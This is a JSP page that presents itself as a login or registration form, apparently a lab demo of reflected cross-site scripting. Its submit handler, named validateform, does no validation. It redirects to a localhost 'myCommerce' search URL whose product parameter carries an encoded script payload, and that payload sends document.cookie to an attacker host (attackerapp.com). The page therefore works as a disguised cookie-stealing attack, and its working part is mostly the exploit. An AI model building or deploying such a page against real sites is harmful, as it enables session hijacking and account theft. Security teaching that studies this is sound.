<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Login Page</title>

<script>  
function validateform(){  
	
	urlToFire = 'http://localhost:8080/myCommerce/productSearch?product=%3Cscript%3Ewindow.location%3D%22http%3A%2F%2Fattackerapp.com%3Fcookie%3D%22%2Bdocument.cookie%3C%2Fscript%3E';
	window.location = urlToFire;
	return false;
}
</script>
</head>
<body>
<form method = "post" onsubmit = "return validateform()">

    <h1>Register</h1>
    <p>Please fill in this form to create an account.</p>
    <hr>

    <label for="email"><b>Email</b></label>
    <input type="text" placeholder="Plase Enter Email" name="email" required>

    <label for="psw"><b>Password</b></label>
    <input type="password" placeholder="Please Enter Password" name="password" required>

    <label for="psw-repeat"><b>Repeat Password</b></label>
    <input type="password" placeholder="Please Repeat Password" name="confirmPassword" required>
    <hr>
  
    <input type="submit">Register</input>

    <p>Already have an account? <a href="#">Sign in</a>.</p>

</form>

</body>
</html>